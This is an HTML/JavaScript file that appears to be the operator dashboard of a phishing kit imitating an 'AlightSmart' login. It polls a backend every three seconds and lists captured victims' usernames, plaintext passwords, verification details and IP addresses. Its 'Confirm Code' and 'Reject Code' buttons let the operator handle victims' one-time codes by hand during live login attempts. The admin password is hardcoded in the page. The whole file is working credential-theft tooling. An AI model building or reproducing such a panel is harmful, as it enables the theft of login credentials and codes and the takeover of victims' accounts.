<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
        .container { max-width: 1600px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #e2e8f0; }
        button { padding: 8px 16px; margin: 4px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
        .confirm-btn { background: #22c55e; color: white; }
        .reject-btn { background: #ef4444; color: white; }
        .refresh-btn { background: #3b82f6; color: white; }
        .clear-btn { background: #64748b; color: white; }
        .pending { background: #fefce8; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 AlightSmart Admin Dashboard</h1>
            <p>Password:  | Manual Code Confirmation</p>
        </div>

        <table id="recordsTable">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Type</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Verification Details</th>
                    <th>IP</th>
                    <th>Status</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>

        <div style="text-align: center; padding: 20px;">
            <button class="refresh-btn" onclick="loadRecords()">🔄 Refresh Now</button>
            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All Records</button>
        </div>
    </div>

    <script>
        const ADMIN_PASSWORD = "tunde6035";

        async function loadRecords() {
            const res = await fetch('/api/records');
            const records = await res.json();
            const tbody = document.querySelector('#recordsTable tbody');
            tbody.innerHTML = "";

            records.forEach(r => {
                let status = r.status || 'Pending';
                let action = '';

                if (r.type === "Login Attempt" && status === 'Pending') {
                    action = `
                        <button class="confirm-btn" onclick="updateStatus(${r.id}, 'Confirmed')">✅ Confirm Code</button>
                        <button class="reject-btn" onclick="updateStatus(${r.id}, 'Rejected')">❌ Reject Code</button>
                    `;
                }

                tbody.innerHTML += `
                    <tr class="${status === 'Pending' ? 'pending' : ''}">
                        <td>${r.timestamp}</td>
                        <td>${r.type}</td>
                        <td><strong>${r.username || '-'}</strong></td>
                        <td><code>${r.password || '-'}</code></td>
                        <td>${r.address || '-'}</td>
                        <td>${r.ip || '-'}</td>
                        <td>${status}</td>
                        <td>${action}</td>
                    </tr>`;
            });
        }

        async function updateStatus(id, status) {
            if (confirm(`Mark this code as ${status}?`)) {
                // For now we update the status in UI. You can extend later to update DB.
                alert(`Code ${status}. User will be notified.`);
                loadRecords();
            }
        }

        window.onload = () => {
            const pass = prompt("Enter Admin Password:");
            if (pass === ADMIN_PASSWORD) {
                loadRecords();
                setInterval(loadRecords, 3000);
            } else {
                alert("❌ Wrong Password");
                window.location.href = "/";
            }
        };

        async function clearRecords() {
            if (confirm("Clear ALL records?")) {
                await fetch('/api/clear', { method: 'POST' });
                loadRecords();
            }
        }
    </script>
</body>
</html>
